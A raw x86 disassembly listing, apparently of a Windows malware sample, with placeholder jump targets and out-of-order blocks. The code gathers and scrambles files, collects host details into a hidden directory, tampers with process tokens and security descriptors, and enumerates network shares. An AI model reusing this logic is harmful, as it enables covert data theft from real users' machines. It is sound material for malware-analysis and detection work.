lea edx [ ebp - 0x348 ]
push esi
push edx
push eax
call [ ecx + 0xc ]
test eax eax
jl r-xdata
cmp [ ebp - 0x348 ] 0x42
jle r-xdata
mov eax [ ebp - 0x148 ]
and eax 0x10
cmp al 0x10
je r-xdata
lea eax [ ebp - 0x11c ]
push eax
call sub_4023c5
test eax eax
pop ecx
je r-xdata
lea eax [ ebp - 0x348 ]
push eax
call sub_4027a1
pop ecx
sub_4024fb
push ebp
mov ebp esp
sub esp 0x640
push esi
push 0x8
lea eax [ ebp - 0x100 ]
push 0x100
push eax
call sub_404cef
lea eax [ ebp - 0x100 ]
push eax
lea eax [ ebp - 0x640 ]
push eax
call strcpy
lea eax [ ebp - 0x100 ]
push rw-data
push eax
call strcat
add esp 0x1c
lea eax [ ebp - 0x240 ]
push eax
lea eax [ ebp - 0x100 ]
push eax
call [ FindFirstFileA@IAT ]
mov esi eax
cmp esi 0xffffffff
je r-xdata
pop esi
leave
retn
lea eax [ ebp - 0x640 ]
push eax
lea eax [ ebp - 0x440 ]
push eax
call strcpy
lea eax [ ebp - 0x440 ]
push rw-data
push eax
call strcat
lea eax [ ebp - 0x214 ]
push eax
lea eax [ ebp - 0x440 ]
push eax
call strcat
lea eax [ ebp - 0x440 ]
push eax
call sub_402418
add esp 0x1c
lea eax [ ebp - 0x240 ]
push eax
push esi
call [ FindNextFileA@IAT ]
test eax eax
jne r-xdata
push esi
call [ FindClose@IAT ]
sub_4025bc
push ecx
call sub_404e0e
call sub_4024fb
and [ esp ] 0x0
cmp [ rw-data ] 0x0
jle r-xdata
pop ecx
retn
push ebx
push ebp
push esi
push edi
mov esi rw-data
inc [ esp + 0x10 ]
add esi 0x884
mov eax [ esp + 0x10 ]
cmp eax [ rw-data ]
jl r-xdata
lea ebp [ esi + 0x4 ]
lea edi [ esi + 0x104 ]
xor ebx ebx
cmp [ esi ] ebx
jle r-xdata
pop edi
pop esi
pop ebp
pop ebx
push edi
push ebp
call sub_40261a
inc ebx
pop ecx
add edi 0x40
cmp ebx [ esi ]
pop ecx
jl r-xdata
sub_40261a
push ebp
mov ebp esp
sub esp 0x65c
push ebx
push esi
push edi
mov edi [ sprintf@IAT ]
push [ ebp + 0x8 ]
lea eax [ ebp - 0x65c ]
push rw-data
push eax
call edi
add esp 0xc
lea eax [ ebp - 0x15c ]
push eax
lea eax [ ebp - 0x65c ]
push eax
call [ FindFirstFileA@IAT ]
cmp eax 0xffffffff
mov [ ebp - 0x4 ] eax
je r-xdata
push 0x1
pop eax
mov ebx [ ebp + 0xc ]
lea eax [ ebp - 0x15c ]
push eax
push [ ebp - 0x4 ]
call [ FindNextFileA@IAT ]
test eax eax
je r-xdata
lea eax [ ebp - 0x130 ]
push eax
lea eax [ ebp - 0x25c ]
push eax
call strcpy
lea eax [ ebp - 0x25c ]
push eax
lea eax [ ebp - 0x45c ]
push [ ebp + 0x8 ]
push rw-data
push eax
call edi
add esp 0x18
test [ ebp - 0x15c ] 0x10
je r-xdata
push [ ebp - 0x4 ]
call [ FindClose@IAT ]
jmp r-xdata
cmp [ rw-data ] 0xffffffff
push 0x1
pop esi
je r-xdata
lea eax [ ebp - 0x45c ]
push ebx
push eax
call sub_40261a
pop ecx
test eax eax
pop ecx
je r-xdata
cmp [ ebp - 0x130 ] 0x2e
je r-xdata
push ebx
call strlen
cmp eax 0x2
pop ecx
jb r-xdata
lea eax [ ebp - 0x1c ]
push eax
call [ GetSystemTime@IAT ]
lea eax [ ebp - 0xc ]
push eax
lea eax [ ebp - 0x1c ]
push eax
call [ SystemTimeToFileTime@IAT ]
mov eax [ rw-data ]
push 0xffffff36
cdq
push 0xd5964000
push edx
push eax
call sub_40abe0
add [ ebp - 0xc ] eax
lea eax [ ebp - 0xc ]
push eax
lea eax [ ebp - 0x148 ]
push eax
adc [ ebp - 0x8 ] edx
call [ CompareFileTime@IAT ]
test eax eax
jge r-xdata
push [ ebp - 0x4 ]
call [ FindClose@IAT ]
xor eax eax
jmp r-xdata
jmp r-xdata
lea eax [ ebp - 0x130 ]
push 0x2e
push eax
call [ strrchr@IAT ]
pop ecx
test eax eax
pop ecx
jne r-xdata
xor esi esi
pop edi
pop esi
pop ebx
leave
retn
add eax 0x2
push eax
lea eax [ ebp - 0x130 ]
push eax
call strcmp
pop ecx
pop ecx
test eax eax
cmp [ ebx + 0x2 ] al
jmp r-xdata
test esi esi
je r-xdata
xor esi esi
je r-xdata
lea eax [ ebp - 0x45c ]
push eax
call sub_4027a1
pop ecx
sub_4027a1
push ebp
mov ebp esp
sub esp 0x614
push ebx
push esi
push edi
push 0x5c
push [ ebp + 0x8 ]
call [ strrchr@IAT ]
mov esi eax
pop ecx
test esi esi
pop ecx
je r-xdata
pop edi
pop esi
pop ebx
leave
retn
lea eax [ ebp - 0x214 ]
push rw-data
push eax
call strcpy
lea eax [ ebp - 0x214 ]
push esi
push eax
call strcat
lea eax [ ebp - 0x214 ]
push eax
lea eax [ ebp - 0x414 ]
push eax
call strcpy
add esp 0x18
lea eax [ ebp - 0x414 ]
push 0x0
push eax
push [ ebp + 0x8 ]
call [ CopyFileA@IAT ]
mov esi [ sprintf@IAT ]
mov ebx rw-data
lea eax [ ebp - 0x214 ]
push ebx
push eax
mov edi rw-data
lea eax [ ebp - 0x214 ]
push edi
push eax
call esi
lea eax [ ebp - 0x414 ]
push eax
call sub_402a0f
add esp 0x14
cmp eax 0xffffffff
mov [ ebp - 0x4 ] eax
je r-xdata
lea eax [ ebp - 0x414 ]
push eax
call [ DeleteFileA@IAT ]
test eax eax
je r-xdata
mov ecx [ rw-data ]
xor edx edx
div ecx
xor edx edx
mov [ ebp + 0x8 ] eax
mov eax [ ebp - 0x4 ]
div ecx
test edx edx
je r-xdata
push ecx
call [ malloc@IAT ]
test eax eax
pop ecx
mov [ ebp - 0x8 ] eax
je r-xdata
inc [ ebp + 0x8 ]
mov eax [ ebp - 0x4 ]
cmp eax [ rw-data ]
ja r-xdata
lea eax [ ebp - 0x414 ]
push rw-data
push eax
call [ fopen@IAT ]
pop ecx
mov [ ebp - 0xc ] eax
test eax eax
pop ecx
je r-xdata
lea eax [ ebp - 0x214 ]
push eax
lea eax [ ebp - 0x414 ]
push eax
call sub_402aad
pop ecx
jmp r-xdata
push [ ebp - 0x8 ]
call [ free@IAT ]
pop ecx
lea eax [ ebp - 0x414 ]
push 0x0
push eax
call [ SetFileAttributesA@IAT ]
lea eax [ ebp - 0x414 ]
push eax
call [ DeleteFileA@IAT ]
lea eax [ ebp - 0x414 ]
push eax
lea eax [ ebp - 0x214 ]
push eax
call [ rename@IAT ]
pop ecx
pop ecx
jmp r-xdata
push 0x1
pop eax
cmp [ ebp + 0x8 ] eax
mov [ ebp - 0x4 ] eax
jl r-xdata
pop ecx
push [ ebp - 0xc ]
call [ fclose@IAT ]
push [ ebp - 0x4 ]
lea eax [ ebp - 0x414 ]
push [ ebp + 0x8 ]
push eax
lea eax [ ebp - 0x614 ]
push rw-data
push eax
call esi
lea eax [ ebp - 0x614 ]
push eax
lea eax [ ebp - 0x214 ]
push eax
call strcpy
lea eax [ ebp - 0x214 ]
push ebx
push eax
lea eax [ ebp - 0x214 ]
push edi
push eax
call esi
push [ ebp - 0xc ]
push [ rw-data ]
push 0x1
push [ ebp - 0x8 ]
call [ fread@IAT ]
mov [ ebp - 0x10 ] eax
lea eax [ ebp - 0x614 ]
push rw-data
push eax
call [ fopen@IAT ]
add esp 0x44
mov [ ebp - 0x14 ] eax
test eax eax
je r-xdata
push eax
push [ ebp - 0x10 ]
push 0x1
push [ ebp - 0x8 ]
call [ fwrite@IAT ]
push [ ebp - 0x14 ]
call [ fclose@IAT ]
lea eax [ ebp - 0x214 ]
push eax
lea eax [ ebp - 0x614 ]
push eax
call sub_402aad
lea eax [ ebp - 0x214 ]
push eax
lea eax [ ebp - 0x414 ]
push eax
call sub_404d86
add esp 0x24
lea eax [ ebp - 0x614 ]
push eax
call [ DeleteFileA@IAT ]
lea eax [ ebp - 0x614 ]
push eax
lea eax [ ebp - 0x214 ]
push eax
call [ rename@IAT ]
inc [ ebp - 0x4 ]
pop ecx
mov eax [ ebp - 0x4 ]
pop ecx
cmp eax [ ebp + 0x8 ]
jle r-xdata
sub_402a0f
push esi
push edi
xor edi edi
push edi
push 0x80
push 0x3
push edi
push 0x3
push 0x80000000
push [ esp + 0x24 ]
call [ CreateFileA@IAT ]
mov esi eax
or eax 0xffffffff
cmp esi eax
je r-xdata
pop edi
pop esi
retn
push edi
push esi
call [ GetFileSize@IAT ]
push esi
mov edi eax
call [ CloseHandle@IAT ]
mov eax edi
sub_402a4c
push ebp
mov ebp esp
sub esp 0x80
push ebx
push rw-data
push [ ebp + 0x8 ]
call [ fopen@IAT ]
mov ebx eax
pop ecx
test ebx ebx
pop ecx
je r-xdata
pop ebx
leave
retn
push esi
push edi
mov esi rw-data
push ebx
push esi
call strlen
pop ecx
push eax
lea eax [ ebp - 0x80 ]
push 0x1
push eax
call [ fread@IAT ]
push ebx
mov edi eax
call [ fclose@IAT ]
and [ ebp + edi - 0x80 ] 0x0
lea eax [ ebp - 0x80 ]
push esi
push eax
call strcmp
add esp 0x1c
neg eax
sbb eax eax
pop edi
inc eax
pop esi
sub_402aad
push ebp
mov ebp esp
sub esp 0x14
push ebx
push esi
mov esi [ ebp + 0x8 ]
push edi
push esi
call sub_402a4c
test eax eax
pop ecx
je r-xdata
push esi
call sub_402a0f
cmp eax [ rw-data ]
pop ecx
mov [ ebp - 0xc ] eax
ja r-xdata
push 0x0
push [ ebp + 0xc ]
push esi
call [ CopyFileA@IAT ]
jmp r-xdata
pop edi
pop esi
pop ebx
leave
retn
push rw-data
push esi
mov esi [ fopen@IAT ]
call esi
push rw-data
mov [ ebp - 0x4 ] eax
push [ ebp + 0xc ]
call esi
add esp 0x10
cmp [ ebp - 0x4 ] 0x0
mov ebx eax
je r-xdata
test ebx ebx
je r-xdata
mov esi [ rw-data ]
and [ ebp - 0x10 ] 0x0
mov [ ebp - 0x14 ] esi
fild [ ebp - 0x14 ]
fmul [ r--data ]
call _ftol
push 0x10
pop edi
push esi
mov esi [ malloc@IAT ]
sub edi eax
call esi
test eax eax
pop ecx
mov [ rw-data ] eax
je r-xdata
push edi
call esi
test eax eax
pop ecx
mov [ rw-data ] eax
je r-xdata
push [ ebp - 0x4 ]
push [ ebp - 0xc ]
push 0x1
push [ rw-data ]
call [ fread@IAT ]
push eax
lea eax [ ebp - 0x8 ]
push [ rw-data ]
push eax
push [ rw-data ]
call sub_405089
add esp 0x20
test eax eax
jne r-xdata
push [ ebp - 0x4 ]
mov esi [ fclose@IAT ]
call esi
push ebx
call esi
push [ rw-data ]
mov esi [ free@IAT ]
call esi
push [ rw-data ]
call esi
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_404d86
add esp 0x18
push [ ebp - 0x8 ]
push [ rw-data ]
call sub_402c07
pop ecx
mov esi rw-data
pop ecx
push ebx
push esi
call strlen
pop ecx
push eax
push 0x1
push esi
mov esi [ fwrite@IAT ]
call esi
push ebx
push [ ebp - 0x8 ]
push 0x1
push [ rw-data ]
call esi
add esp 0x20
sub_402c07
xor edx edx
cmp [ esp + 0x8 ] edx
jle r-xdata
retn
push ebx
mov eax [ esp + 0x8 ]
lea ecx [ edx + eax ]
mov al [ edx + eax ]
add al dl
mov bl al
shr bl 0x4
shl al 0x4
add bl al
xor bl 0x23
inc edx
cmp edx [ esp + 0xc ]
mov [ ecx ] bl
jl r-xdata
pop ebx
sub_402c64
push ebp
mov ebp esp
mov eax 0x5fac
call sub_40ac20
lea eax [ ebp - 0x100 ]
push rw-data
push eax
call strcpy
lea eax [ ebp - 0x100 ]
push rw-data
push eax
call strcat
lea eax [ ebp - 0x100 ]
push rw-data
push eax
call strcat
lea eax [ ebp - 0x100 ]
push rw-data
push eax
call [ fopen@IAT ]
add esp 0x20
test eax eax
je r-xdata
push 0x5
lea eax [ ebp - 0x200 ]
push 0x100
push eax
call sub_404cef
push 0x1
pop eax
mov [ rw-data ] eax
mov [ rw-data ] eax
lea eax [ ebp - 0x200 ]
push eax
push rw-data
call strcpy
push rw-data
push rw-data
call strcpy
add esp 0x1c
leave
retn
push esi
push edi
push eax
call [ fclose@IAT ]
mov esi [ GetPrivateProfileIntA@IAT ]
pop ecx
lea eax [ ebp - 0x100 ]
push eax
push 0x0
push rw-data
push rw-data
call esi
mov [ rw-data ] eax
lea eax [ ebp - 0x100 ]
mov edi 0x4e2000
push eax
push edi
push rw-data
push rw-data
call esi
mov [ rw-data ] eax
lea eax [ ebp - 0x100 ]
push eax
lea eax [ ebp - 0x5fac ]
push 0x5dac
push eax
push rw-data
push rw-data
push rw-data
call [ GetPrivateProfileStringA@IAT ]
lea eax [ ebp - 0x100 ]
push eax
push 0xffffffff
push rw-data
push rw-data
call esi
mov [ rw-data ] eax
mov eax 0x2710
cmp [ rw-data ] eax
jae r-xdata
cmp [ rw-data ] edi
jbe r-xdata
mov [ rw-data ] eax
lea eax [ ebp - 0x5fac ]
push eax
call sub_402dc1
pop ecx
pop edi
pop esi
leave
retn
mov [ rw-data ] edi
sub_402dc1
push ebp
mov ebp esp
mov eax 0x5dac
call sub_40ac20
and [ rw-data ] 0x0
push ebx
push esi
push edi
push 0x5528
mov edi rw-data
push 0x0
push edi
call memset
push [ ebp + 0x8 ]
lea eax [ ebp - 0x5dac ]
push eax
call strcpy
lea esi [ ebp - 0x5dac ]
add esp 0x14
dec esi
test ebx ebx
je r-xdata
and [ esi ] 0x0
mov eax [ rw-data ]
imul eax eax 0x884
add eax edi
push ebx
push eax
call sub_402e5d
inc [ rw-data ]
pop ecx
pop ecx
jmp r-xdata
inc [ rw-data ]
pop edi
pop esi
pop ebx
leave
retn
mov eax [ rw-data ]
push ebx
imul eax eax 0x884
add eax edi
push eax
call sub_402e5d
pop ecx
pop ecx
lea ebx [ esi + 0x1 ]
push 0x3b
push ebx
call [ strchr@IAT ]
mov esi eax
pop ecx
test esi esi
pop ecx
je r-xdata
sub_402e5d
push ebp
mov ebp esp
mov eax 0x5dac
call sub_40ac20
push ebx
push esi
push edi
lea eax [ ebp - 0x5dac ]
push [ ebp + 0xc ]
push eax
call strcpy
mov ebx [ strchr@IAT ]
lea eax [ ebp - 0x5dac ]
push 0x2c
push eax
call ebx
mov edi eax
add esp 0x10
test edi edi
je r-xdata
pop edi
pop esi
pop ebx
leave
retn
mov esi [ ebp + 0x8 ]
and [ edi ] 0x0
lea eax [ ebp - 0x5dac ]
push eax
lea eax [ esi + 0x4 ]
push eax
call strcpy
pop ecx
pop ecx
cmp [ ebp + 0xc ] 0x0
je r-xdata
and [ edi ] 0x0
mov eax [ esi ]
push [ ebp + 0xc ]
shl eax 0x6
lea eax [ eax + esi + 0x104 ]
push eax
call strcpy
inc [ esi ]
pop ecx
pop ecx
jmp r-xdata
mov eax [ esi ]
push [ ebp + 0xc ]
shl eax 0x6
lea eax [ eax + esi + 0x104 ]
push eax
call strcpy
inc [ esi ]
pop ecx
pop ecx
inc edi
push 0x2c
push edi
mov [ ebp + 0xc ] edi
call ebx
mov edi eax
pop ecx
test edi edi
pop ecx
je r-xdata
sub_402f01
push esi
mov esi [ esp + 0x8 ]
push 0x0
push esi
call [ CreateDirectoryA@IAT ]
push esi
call [ GetFileAttributesA@IAT ]
or al 0x6
push eax
push esi
call [ SetFileAttributesA@IAT ]
pop esi
retn
sub_402f22
push esi
push rw-data
push rw-data
call [ fopen@IAT ]
pop ecx
mov esi eax
pop ecx
push esi
push 0x1
push [ esp + 0x10 ]
call strlen
pop ecx
push eax
push [ esp + 0x14 ]
call [ fwrite@IAT ]
push esi
call [ fclose@IAT ]
add esp 0x14
pop esi
retn
sub_402f5b
push ebp
mov ebp esp
sub esp 0x200
push esi
push edi
mov edi 0x9c
mov esi rw-data
push edi
push 0x0
push esi
call memset
add esp 0xc
mov [ rw-data ] edi
mov edi [ GetVersionExA@IAT ]
push esi
call edi
test eax eax
jne r-xdata
lea eax [ ebp - 0x200 ]
push eax
push esi
call sub_4038c0
push rw-data
call sub_402f22
lea eax [ ebp - 0x200 ]
push eax
call sub_402f22
add esp 0x10
pop edi
pop esi
leave
retn
push esi
mov [ rw-data ] 0x94
call edi
sub_402fc6
push ebp
mov ebp esp
sub esp 0x104
push esi
lea eax [ ebp - 0x4 ]
mov esi rw-data
push eax
push esi
mov [ ebp - 0x4 ] 0x100
call [ GetComputerNameA@IAT ]
mov eax [ ebp - 0x4 ]
push rw-data
and [ eax + rw-data ] 0x0
call sub_402f22
push esi
call sub_402f22
pop ecx
lea eax [ ebp - 0x104 ]
pop ecx
push 0xff
push eax
call gethostname
test eax eax
jne r-xdata
push rw-data
lea eax [ ebp - 0x104 ]
push eax
call gethostbyname
test eax eax
je r-xdata
mov eax [ eax + 0xc ]
mov eax [ eax ]
push [ eax ]
call inet_ntoa
push eax
jmp r-xdata
mov esi rw-data
push esi
call strcpy
pop ecx
pop ecx
push rw-data
call sub_402f22
push esi
call sub_402f22
pop ecx
pop ecx
pop esi
leave
retn
sub_40305e
push ebp
mov ebp esp
sub esp 0x2c
mov ecx [ ebp + 0xc ]
push ebx
mov [ ebp - 0x2c ] ecx
lea ecx [ ebp - 0xc ]
push 0x1
mov [ ebp - 0x10 ] ecx
pop eax
lea ecx [ ebp + 0xc ]
xor ebx ebx
push ecx
lea ecx [ ebp - 0x2c ]
push ebx
push ecx
push eax
mov [ ebp - 0xc ] al
mov [ ebp - 0xb ] al
mov [ ebp - 0xa ] bl
mov [ ebp - 0x9 ] bl
mov [ ebp - 0x8 ] bl
mov [ ebp - 0x7 ] bl
mov [ ebp - 0x6 ] bl
mov [ ebp - 0x5 ] al
mov [ ebp - 0x4 ] ebx
mov [ ebp - 0x28 ] 0x2
mov [ ebp - 0x24 ] ebx
mov [ ebp - 0x20 ] ebx
mov [ ebp - 0x1c ] ebx
mov [ ebp - 0x18 ] ebx
mov [ ebp - 0x14 ] eax
mov [ ebp + 0xc ] ebx
call SetEntriesInAclA
test eax eax
jne r-xdata
xor eax eax
push esi
push ebx
push [ ebp + 0xc ]
push ebx
push ebx
push 0x4
push 0x6
push [ ebp + 0x8 ]
call SetSecurityInfo
push [ ebp + 0xc ]
mov esi eax
call [ LocalFree@IAT ]
xor eax eax
cmp esi ebx
sete al
pop esi
jmp r-xdata
pop ebx
leave
retn
sub_4030ea
push ebp
mov ebp esp
sub esp 0x10
lea eax [ ebp - 0xc ]
mov [ ebp - 0x10 ] 0x1
push eax
mov [ ebp - 0x4 ] 0x2
push [ ebp + 0xc ]
push 0x0
call [ LookupPrivilegeValueA@IAT ]
test eax eax
je r-xdata
xor eax eax
leave
retn
push 0x10
lea ecx [ ebp + 0xc ]
pop eax
push ecx
mov [ ebp + 0xc ] eax
push [ ebp + 0x10 ]
push eax
lea eax [ ebp - 0x10 ]
push eax
push 0x0
push [ ebp + 0x8 ]
call [ AdjustTokenPrivileges@IAT ]
test eax eax
je r-xdata
call [ GetLastError@IAT ]
xor ecx ecx
cmp eax 0x514
setne cl
mov eax ecx
leave
retn
sub_40315f
push ebp
mov ebp esp
sub esp 0x21c
push ebx
push esi
push edi
mov edi [ OpenProcess@IAT ]
push [ ebp + 0x8 ]
xor ebx ebx
push ebx
push [ ebp + 0xc ]
call edi
cmp eax ebx
mov [ ebp - 0xc ] eax
jne r-xdata
mov eax [ ebp - 0xc ]
push [ ebp + 0x8 ]
push ebx
push 0x40000
call edi
mov esi [ GetCurrentProcess@IAT ]
cmp eax ebx
mov [ ebp - 0x4 ] eax
jne r-xdata
push [ ebp + 0xc ]
push eax
call sub_40305e
pop ecx
lea eax [ ebp - 0xc ]
pop ecx
push ebx
push ebx
push [ ebp + 0xc ]
push eax
call esi
push eax
push [ ebp - 0x4 ]
call esi
push eax
call [ DuplicateHandle@IAT ]
test eax eax
jne r-xdata
lea eax [ ebp - 0x8 ]
push eax
push 0x28
call esi
push eax
call [ OpenProcessToken@IAT ]
test eax eax
je r-xdata
push [ ebp - 0x4 ]
call [ CloseHandle@IAT ]
mov [ ebp - 0xc ] ebx
pop edi
pop esi
pop ebx
leave
retn
lea eax [ ebp - 0x1c ]
push eax
push rw-data
push [ ebp - 0x8 ]
call sub_4030ea
add esp 0xc
test eax eax
je r-xdata
push [ ebp - 0x8 ]
call [ CloseHandle@IAT ]
mov eax [ ebp - 0x4 ]
cmp eax ebx
je r-xdata
push [ ebp + 0x8 ]
push ebx
push 0x80000
call edi
mov edi eax
cmp edi ebx
je r-xdata
lea eax [ ebp - 0x1c ]
push eax
push [ ebp - 0x8 ]
call sub_40314a
pop ecx
pop ecx
lea ecx [ ebp + 0x8 ]
mov eax 0x200
push ecx
mov [ ebp + 0x8 ] eax
push eax
lea eax [ ebp - 0x21c ]
push eax
push 0x1
push [ ebp - 0x8 ]
call [ GetTokenInformation@IAT ]
test eax eax
je r-xdata
push edi
call [ CloseHandle@IAT ]
push ebx
push ebx
push ebx
push [ ebp - 0x21c ]
push 0x1
push 0x6
push edi
call SetSecurityInfo
test eax eax
jne r-xdata
push ebx
push ebx
lea eax [ ebp - 0x4 ]
push 0x40000
push eax
call esi
push eax
push edi
call esi
push eax
call [ DuplicateHandle@IAT ]
test eax eax
jne r-xdata
mov [ ebp - 0x4 ] ebx
sub_40329c
push ebp
mov ebp esp
sub esp 0x108
push ebx
mov ebx [ ebp + 0x8 ]
push esi
push edi
test ebx ebx
je r-xdata
pop edi
pop esi
pop ebx
leave
retn
cmp [ ebx ] 0x0
je r-xdata
mov esi rw-data
push esi
call strlen
mov edi rw-data
mov [ ebp + 0x8 ] eax
push edi
call strlen
push [ ebp + 0x8 ]
mov [ ebp - 0x4 ] eax
push esi
mov esi [ _strnicmp@IAT ]
push ebx
call esi
add esp 0x14
test eax eax
jne r-xdata
push [ ebp - 0x4 ]
push edi
push ebx
call esi
add esp 0xc
test eax eax
jne r-xdata
lea eax [ ebp - 0x108 ]
push 0x104
push eax
call [ GetWindowsDirectoryA@IAT ]
test eax eax
je r-xdata
mov eax [ ebp - 0x4 ]
add eax ebx
push eax
push ebx
call strcpy
pop ecx
pop ecx
lea eax [ ebp - 0x108 ]
push rw-data
push eax
call strcat
mov eax [ ebp + 0x8 ]
add eax ebx
push eax
lea eax [ ebp - 0x108 ]
push eax
call strcat
lea eax [ ebp - 0x108 ]
push eax
push ebx
call strcpy
add esp 0x18
jmp r-xdata
sub_403358
push ebp
mov ebp esp
sub esp 0x4c0
lea eax [ ebp + 0x8 ]
mov [ ebp - 0x8 ] 0x100
push eax
push 0x20008
push [ ebp + 0x8 ]
mov [ ebp - 0x4 ] 0xc8
call [ OpenProcessToken@IAT ]
test eax eax
jne r-xdata
lea eax [ ebp - 0xc ]
push eax
lea eax [ ebp - 0x4c0 ]
push 0x3e8
push eax
push 0x1
push [ ebp + 0x8 ]
call [ GetTokenInformation@IAT ]
test eax eax
je r-xdata
xor eax eax
leave
retn
lea eax [ ebp - 0x10 ]
push eax
lea eax [ ebp - 0x4 ]
push eax
lea eax [ ebp - 0xd8 ]
push eax
lea eax [ ebp - 0x8 ]
push eax
push [ ebp + 0xc ]
push [ ebp - 0x4c0 ]
push 0x0
call [ LookupAccountSidA@IAT ]
neg eax
sbb eax eax
neg eax
leave
retn
sub_4033d4
push ebp
mov ebp esp
sub esp 0x944
push ebx
mov ebx [ CloseHandle@IAT ]
push esi
xor esi esi
cmp [ rw-data ] 0x2
push edi
mov [ ebp - 0x4 ] esi
mov [ ebp - 0xc ] esi
mov [ ebp - 0x10 ] esi
jne r-xdata
push 0x0
push 0x2
call CreateToolhelp32Snapshot
cmp eax 0xffffffff
mov [ ebp - 0x8 ] eax
je r-xdata
push rw-data
call [ LoadLibraryA@IAT ]
mov edi eax
cmp edi esi
mov [ ebp - 0x4 ] edi
je r-xdata
cmp [ ebp - 0x4 ] 0x0
pop edi
pop esi
pop ebx
je r-xdata
lea ecx [ ebp - 0x144 ]
mov [ ebp - 0x144 ] 0x128
push ecx
push eax
call Process32First
test eax eax
je r-xdata
cmp [ ebp - 0x8 ] 0xffffffff
je r-xdata
mov esi [ GetProcAddress@IAT ]
push rw-data
push edi
call esi
push rw-data
push edi
mov [ ebp - 0xc ] eax
call esi
cmp [ ebp - 0xc ] 0x0
mov [ ebp - 0x10 ] eax
je r-xdata
leave
retn
push [ ebp - 0x4 ]
call [ FreeLibrary@IAT ]
push rw-data
call sub_402f22
pop ecx
mov esi 0x410
push [ ebp - 0x8 ]
call ebx
test eax eax
je r-xdata
cmp [ rw-data ] 0x1
jne r-xdata
push esi
push [ ebp - 0x13c ]
call sub_40315f
pop ecx
mov edi eax
pop ecx
lea eax [ ebp - 0x1c ]
push eax
lea eax [ ebp - 0x14 ]
push 0x4
push eax
push edi
call [ ebp - 0xc ]
test eax eax
je r-xdata
cmp [ ebp - 0x13c ] 0x0
jne r-xdata
lea eax [ ebp - 0x120 ]
push eax
lea eax [ ebp - 0x444 ]
push eax
call strcpy
lea eax [ ebp - 0x644 ]
push 0x5c
push eax
mov [ ebp - 0x18 ] 0x100
call [ strrchr@IAT ]
inc eax
push eax
lea eax [ ebp - 0x744 ]
push eax
call strcpy
lea eax [ ebp - 0x744 ]
push eax
lea eax [ ebp - 0x644 ]
push eax
call strcpy
add esp 0x20
lea eax [ ebp - 0x18 ]
push eax
lea eax [ ebp - 0x244 ]
push eax
call [ GetUserNameA@IAT ]
lea eax [ ebp - 0x244 ]
push eax
push edi
call sub_403358
pop ecx
test eax eax
pop ecx
jne r-xdata
lea eax [ ebp - 0x444 ]
push 0x200
push eax
push [ ebp - 0x14 ]
push edi
call [ ebp - 0x10 ]
lea eax [ ebp - 0x444 ]
push eax
call sub_40329c
pop ecx
lea eax [ ebp - 0x644 ]
push rw-data
push eax
call [ lstrcmpiA@IAT ]
test eax eax
jne r-xdata
lea eax [ ebp - 0x644 ]
push rw-data
push eax
call strcpy
lea eax [ ebp - 0x444 ]
push rw-data
push eax
call strcpy
add esp 0x10
push edi
call ebx
lea eax [ ebp - 0x244 ]
push rw-data
push eax
call strcpy
pop ecx
pop ecx
push [ ebp - 0x130 ]
lea eax [ ebp - 0x244 ]
push eax
lea eax [ ebp - 0x444 ]
push [ ebp - 0x13c ]
push eax
lea eax [ ebp - 0x644 ]
push eax
lea eax [ ebp - 0x944 ]
push rw-data
push eax
call [ sprintf@IAT ]
lea eax [ ebp - 0x944 ]
push eax
call sub_402f22
add esp 0x20
lea eax [ ebp - 0x144 ]
push eax
push [ ebp - 0x8 ]
call Process32Next
test eax eax
jne r-xdata
lea eax [ ebp - 0x444 ]
push rw-data
push eax
call strcpy
pop ecx
pop ecx
lea eax [ ebp - 0x120 ]
push eax
lea eax [ ebp - 0x644 ]
push eax
call strcpy
pop ecx
pop ecx
push [ ebp - 0x13c ]
push 0x0
push esi
call [ OpenProcess@IAT ]
mov edi eax
push edi
call [ GetPriorityClass@IAT ]
push edi
call ebx
cmp [ rw-data ] 0x2
jne r-xdata
sub_40365e
push ebp
mov ebp esp
sub esp 0x20
push 0x2
xor ecx ecx
pop eax
mov [ ebp - 0x1c ] ecx
mov [ ebp - 0x20 ] eax
mov [ ebp - 0x14 ] eax
lea eax [ ebp - 0x20 ]
mov [ ebp - 0x18 ] 0x3
push eax
mov [ ebp - 0x10 ] ecx
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] ecx
call sub_403691
pop ecx
leave
retn
sub_403691
push ebp
mov ebp esp
sub esp 0x5d0
push ebx
push esi
push edi
push rw-data
call [ LoadLibraryA@IAT ]
mov edi eax
test edi edi
jne r-xdata
mov esi [ GetProcAddress@IAT ]
push rw-data
push edi
call esi
push rw-data
push edi
mov ebx eax
call esi
push edi
mov [ ebp - 0x10 ] eax
call [ FreeLibrary@IAT ]
xor edi edi
cmp ebx edi
je r-xdata
xor eax eax
jmp r-xdata
cmp [ ebp - 0x10 ] edi
je r-xdata
pop edi
pop esi
pop ebx
leave
retn
push rw-data
call sub_402f22
pop ecx
lea eax [ ebp - 0xc ]
or [ ebp - 0x8 ] 0xffffffff
push eax
push [ ebp + 0x8 ]
mov [ ebp - 0x4 ] 0x4000
push edi
push edi
push 0x2
call ebx
test eax eax
jne r-xdata
push [ ebp - 0x4 ]
push 0x40
call [ GlobalAlloc@IAT ]
mov ebx eax
push ebx
call [ GlobalFree@IAT ]
push [ ebp - 0xc ]
call WNetCloseEnum
neg eax
sbb eax eax
inc eax
cmp [ ebp - 0x8 ] edi
mov [ ebp + 0x8 ] edi
jbe r-xdata
push [ ebp - 0x4 ]
push edi
push ebx
call memset
add esp 0xc
lea eax [ ebp - 0x4 ]
push eax
lea eax [ ebp - 0x8 ]
push ebx
push eax
push [ ebp - 0xc ]
call [ ebp - 0x10 ]
cmp eax edi
jne r-xdata
lea esi [ ebx + 0x14 ]
lea eax [ ebp - 0x4d0 ]
push rw-data
push eax
call strcat
mov eax [ esi - 0x4 ]
pop ecx
cmp eax edi
pop ecx
je r-xdata
push eax
lea eax [ ebp - 0x4d0 ]
push eax
call strcat
cmp [ esi - 0x10 ] edi
pop ecx
pop ecx
jne r-xdata
lea eax [ ebp - 0x4d0 ]
push rw-data
push eax
call strcat
mov eax [ esi + 0x4 ]
pop ecx
cmp eax edi
pop ecx
je r-xdata
push eax
lea eax [ ebp - 0x4d0 ]
push eax
call strcat
pop ecx
pop ecx
mov eax [ esi ]
cmp [ eax ] 0x5c
jne r-xdata
lea eax [ ebp - 0x4d0 ]
push rw-data
push eax
call strcat
mov eax [ esi + 0x8 ]
pop ecx
cmp eax edi
pop ecx
je r-xdata
push eax
lea eax [ ebp - 0x4d0 ]
push eax
call strcat
pop ecx
pop ecx
add eax 0x2
push eax
